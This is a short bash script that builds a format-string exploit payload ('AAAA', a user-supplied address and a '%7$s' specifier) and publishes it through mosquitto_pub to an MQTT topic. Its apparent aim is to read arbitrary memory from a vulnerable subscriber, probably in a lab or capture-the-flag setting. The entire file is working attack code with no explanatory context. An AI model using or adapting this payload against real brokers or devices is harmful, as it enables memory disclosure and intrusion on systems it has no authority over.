#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

newline=$(echo "0a0d" | xxd -p -r) # \r\n

address=$(echo $1 | xxd -p -r)

start="AAAA"

printer="$newline$newline%7\$s"

payload=$start$address$printer

$command_prefix "$payload"